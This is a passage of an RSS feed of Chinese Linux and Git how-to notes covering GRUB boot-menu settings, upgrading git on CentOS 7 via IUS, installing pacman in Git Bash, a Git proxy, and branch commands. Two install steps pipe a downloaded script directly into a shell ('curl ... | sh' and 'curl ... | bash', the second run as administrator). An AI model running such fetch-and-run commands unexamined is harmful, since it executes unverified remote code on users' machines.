<div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">GRUB_DEFAULT</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">GRUB_TIMEOUT_STYLE</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">menu # default:menu config hidden</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">GRUB_TIMEOUT</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> # default:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">GRUB_DISTRIBUTOR</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">`lsb_release </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">s </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">&gt;</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">dev</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">null </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2">||</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> echo Debian`</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">GRUB_CMDLINE_LINUX_DEFAULT</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">GRUB_CMDLINE_LINUX</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">update-grub</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>让用户在Grub开机菜单选定的开机项目自动成为默认值</h2>
<div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">GRUB_SAVEDEFAULT</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">GRUB_DEFAULT</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">saved</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> grub-mkconfig</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot/grub/grub.cfg</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>CentOS 7的yum安装较新版本git2.x</title>
      <link>https://www.geekery.cn/note-book/Git/Centos7%E7%9A%84yum%E5%AE%89%E8%A3%85%E8%BE%83%E6%96%B0%E7%89%88%E6%9C%ACgit2.x.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Centos7%E7%9A%84yum%E5%AE%89%E8%A3%85%E8%BE%83%E6%96%B0%E7%89%88%E6%9C%ACgit2.x.html</guid>
      <source url="https://www.geekery.cn/rss.xml">CentOS 7的yum安装较新版本git2.x</source>
      <description>CentOS 7的yum安装较新版本git2.x centos7 默认的git版本是1.8.x 升级依然没有升级到2.x版本 在Git的官网上，对Red Hat Linux安装git建议有两种 对于第一种方式，可以参考其他人的博客，例如https://blog.csdn.net/Juladoe/article/details/76170193 Git第...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>centos7 默认的git版本是1.8.x</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># git --version</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> version</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1.8.3.1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>升级依然没有升级到2.x版本</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> upgrade</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> git</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>在Git的官网上，对Red Hat Linux安装git建议有两种</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1、下载源代码、编译、构建、配置环境变量</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2、第三方仓库IUS</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>对于第一种方式，可以参考其他人的博客，例如<a href="https://blog.csdn.net/Juladoe/article/details/76170193" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/Juladoe/article/details/76170193</a>
Git第三方仓库安装方式（IUS）</p>
<p>这里是 ius 官方的安装说明及使用说明</p>
<p>1.安装使用里面说的自动化安装脚本</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://setup.ius.io</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sh</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>2.然后可以看到 git2u相关内容</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># yum search git </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">...</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Fast</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Version</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Control</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> System</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git2u.x86_64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Fast</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Version</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Control</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> System</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">gitflow.noarch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Extensions</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> providing</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> operations</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> V.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Driessen's branching model</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">...</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>3.执行安装，并查看下版本</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># yum remove -y git | yum -y install git2u</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># git --version</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> version</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2.16.4</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>关于IUS</p>
<p>IUS第三方仓库不仅仅用于 git 的安装，它是包含了很多软件工具，它的使用指南里说明了一切</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">redis40u、redis32u、mysql56u、python36u、、</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Git Bash 中一键安装 pacman</title>
      <link>https://www.geekery.cn/note-book/Git/Git%20Bash%20%E4%B8%AD%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%20pacman.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%20Bash%20%E4%B8%AD%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%20pacman.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git Bash 中一键安装 pacman</source>
      <description>Git Bash 中一键安装 pacman 在 Git Bash 中安装 pacman 的步骤如下： 安装 Git for Windows 打开 Git Bash 终端，右键选择&amp;quot;以管理员身份运行&amp;quot; 运行下面的安装脚本，复制并粘贴以下命令到 Git Bash 中执行 更新 pacman 的 repo：在更新之前，需要初始化 msys key。 首先要以...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>在 Git Bash 中安装 pacman 的步骤如下：</p>
<ol>
<li>
<p>安装 Git for Windows</p>
</li>
<li>
<p>打开 Git Bash 终端，右键选择"以管理员身份运行"</p>
</li>
<li>
<p>运行下面的安装脚本，复制并粘贴以下命令到 Git Bash 中执行</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://www.geekery.cn/sh/LinuxCTS/os/msys2/install-pacman-git-bash.sh</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
<li>
<p>更新 pacman 的 repo：在更新之前，需要初始化 msys key。
首先要以管理员权限打开 Git-Bash。执行以下命令。下面命令的作用是初始化 msys keyring，更新包源，并同步包数据库。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pacman-db-upgrade</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pacman-key</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --init</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pacman-key</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --populate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> msys2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pacman</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -Syuu</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>安装必要的依赖：由于 Git 已经帮我们安装了一部分依赖，我们只需要安装 msys2-keyring 和 pacman-mirrors</p>
</li>
<li>
<p>将安装的 pacman、msys2-keyring 和 pacman-mirrors 及其版本号写入 <code>/etc/package-versions.txt</code>，并用 pacman 将其写入数据库中。如果遇到未找到目标的错误，删除对应行即可</p>
</li>
<li>
<p>修改 <code>/etc/pacman.conf</code>：关闭除 mingw64 和 msys 以外的所有软件源</p>
</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>Git代理配置</title>
      <link>https://www.geekery.cn/note-book/Git/Git%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git代理配置</source>
      <description>Git代理配置 Git 是我经常用的软件。出于某些原因我经常要从 GitHub 这些网站上下载文件。但是 Git 不会从终端中继承代理设置。所以我平时用 export 设置的代理就用不上了。之后在网上找了几种给 Git 设置代理的方法。 设置完之后可以使用这个命令查看 Git 的配置。 想退出查看界面的话就按下 Q 键。 当然还可以使用这个命令直接编辑...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>Git 是我经常用的软件。出于某些原因我经常要从 GitHub 这些网站上下载文件。但是 Git 不会从终端中继承代理设置。所以我平时用 export 设置的代理就用不上了。之后在网上找了几种给 Git 设置代理的方法。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --global</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> http.proxy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'http://192.168.0.1:1080'</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --global</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https.proxy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'http://192.168.0.1:1080'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>设置完之后可以使用这个命令查看 Git 的配置。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --list</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>想退出查看界面的话就按下 Q 键。</p>
<p>当然还可以使用这个命令直接编辑 Git 的配置文件。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --global</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --edit</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>打开配置文件之后会是这样的。</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">proxy = http:</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//192.168.0.1:1080</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">https</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">proxy = http:</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//192.168.0.1:1080</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里的编辑器应该默认是 Vim ，据说可以根据自己爱好换成其他的编辑器。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Git分支管理合并与删除命令</title>
      <link>https://www.geekery.cn/note-book/Git/Git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%A0%E9%99%A4%E5%91%BD%E4%BB%A4.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%A0%E9%99%A4%E5%91%BD%E4%BB%A4.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git分支管理合并与删除命令</source>
      <description>Git分支管理合并与删除命令 几乎所有的版本控制系统都以某种形式支持分支。 使用分支意味着你可以把你的工作从开发主线上分离开来，以免影响开发主线。 在很多版本控制系统中，这是一个略微低效的过程——常常需要完全创建一个源代码目录的副本。对于大项目来说，这样的过程会耗费很多时间。而Git的分支模型则别具一格，创建分支非常的快，在不同分支之间切换也十分的快，...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>几乎所有的版本控制系统都以某种形式支持分支。 使用分支意味着你可以把你的工作从开发主线上分离开来，以免影响开发主线。 在很多版本控制系统中，这是一个略微低效的过程——常常需要完全创建一个源代码目录的副本。对于大项目来说，这样的过程会耗费很多时间。而Git的分支模型则别具一格，创建分支非常的快，在不同分支之间切换也十分的快，这一优势也使得Git鼓励人们更多地使用分支。</p>
<h3>Git保存数据的方式</h3>
<p>在了解分支之前，让我们先来看看Git是如何保存数据的。我的理解是我们每次提交到Git的文件，它并不是只保存每次文件中的差异，而是类似于照片那样将整个文件都在重新保存一份</p>
<h2>Git分支</h2>
<p>Git 会把仓库中的每次提交串成一条时间线，这条时间线就是一个分支。在 Git 里，每个仓库都会有一个主分支，即master分支。HEAD严格来说不是指向提交，而是指向master，master才是指向提交的，所以，HEAD指向的就是当前分支。
一开始的时候，master分支是一条线，Git 用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点，如下图：</p>
<p></p>
<p>每次提交，master分支都会向前移动一步，这样，随着你不断提交，master分支的线也越来越长。</p>
<h2>Git分支创建</h2>
<p>当我们创建新的分支，例如dev时，Git 新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上，如下图：</p>
<p></p>
<p>所以Git 创建一个分支很快，因为除了增加一个dev指针，改变HEAD的指向，工作区的文件则没有任何变化。
在创建完新的分支以后，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变，如下图：</p>
<p></p>
<p>具体创建分支命令如下</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> branch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> //创建一个新的dev分支</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> checkout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> //切换到该分支上</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>当然你也可以使用git checkout -b dev或者git switch -c dev创建dev并切换，相当于以上两条命令。最新版本的 Git 提供了新的git switch命令来切换分支，以便更好的与git checkout 进行区分。
创建好新的分支以后，当我们想查看新的分支时，可以使用</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> branch</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>该命令会列出所有的分支，而当前分支前面会标一个*号。

在分支之间来回切换使用git switch master或者git checkout 分支名</p>
<h2>Git的分支合并、删除</h2>
<p>注意：当我们在dev分支提交修改的文件切换回主分支是查看不到的，此时如果想提交到主分支上去就需要合并分支。
Git分支合并非常的便捷，直接把master指向dev的当前提交，就完成了合并，只是改变了指针，工作区内容不变，合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支。</p>
<p></p>
<p>我们合并分支可以使用git merge该命令用于合并指定分支到当前分支。
分支合并，Git一般 会用Fast forward模式，但这种模式下，删除分支后，会丢掉分支信息。如果要强制禁用Fast forward模式，Git 就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。
我们可以使用</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> merge</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-ff</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "禁用Fast forward模式"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dev</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>来禁用Fast forward模式。合并后，我们用git log看看分支历史：</p>
<p></p>
<p>可以看到，不使用Fast forward模式，merge后就像这样：</p>
<p></p>
<h2>Git分支删除</h2>
<p>使用命令</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> branch</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dev</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
]]></content:encoded>
    </item>
    <item>
      <title>Git创建一个空分支</title>
